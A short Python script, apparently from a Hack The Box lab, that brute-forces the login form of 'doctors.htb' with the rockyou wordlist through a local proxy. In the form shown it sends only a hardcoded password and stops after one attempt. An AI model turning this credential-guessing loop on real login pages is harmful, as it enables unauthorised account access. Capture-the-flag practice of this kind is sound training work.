#!/usr/bin/env python3

import requests

url = "http://doctors.htb/login"
#headers = {"Content-Type":"application/x-www-form-urlencoded"}
proxy = {"http":"http://localhost:8080"}

with open("/usr/share/wordlists/rockyou.txt") as f:
    for l in f:
        #passw = l.strip("\n")
        passw = "imnew"
        data = {"email":"newdude@nowhere.com", "password":passw, "submit":"Login"}
        req = requests.post(url ,data=data, proxies=proxy)
        print(req.status_code)
        if req.status_code != 200:
            print("\nValid creds found!: %s\n" %passw)
            break
        print("Trying with: %s" %passw)
        break
